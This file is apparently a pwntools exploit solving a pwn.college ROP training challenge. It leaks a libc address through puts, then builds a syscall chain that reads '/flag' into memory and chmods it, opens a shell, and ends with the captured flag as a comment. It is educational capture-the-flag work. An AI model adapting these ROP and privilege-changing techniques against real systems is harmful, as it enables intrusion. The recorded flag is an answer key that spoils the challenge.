from pwn import *

elf = context.binary = ELF("./babyrop_level8.1")
libc = ELF("./libc.so.6", checksec=False)
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
pop_rdi = 0x0000000000401a73

io = s.process("/challenge/babyrop_level8.1")

io.send(b'a'*0x38 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.entrypoint))
io.recvuntil(b'Leaving!\n')
leak = u64(io.recv(6).ljust(8, b'\x00'))

libc.address = leak - libc.sym['puts']
info("Leak libc: " + hex(leak))

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pos = elf.bss() + 0x100


chain =  b'a'*0x38
chain += p64(pop_rax) + p64(0)    + p64(pop_rdi) + p64(0)   + p64(pop_rsi) + p64(pos) + p64(pop_rdx) + p64(0x100) + p64(syscall)
chain += p64(pop_rax) + p64(0x5a) + p64(pop_rdi) + p64(pos) + p64(pop_rsi) + p64(7)   + p64(syscall)
io.send(chain)
io.send(b'/flag\x00')
io.close()

sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{Ena4HVdoF7UliSBZmWzv2gc9cMZ.0lN1MDLxIjNyEzW}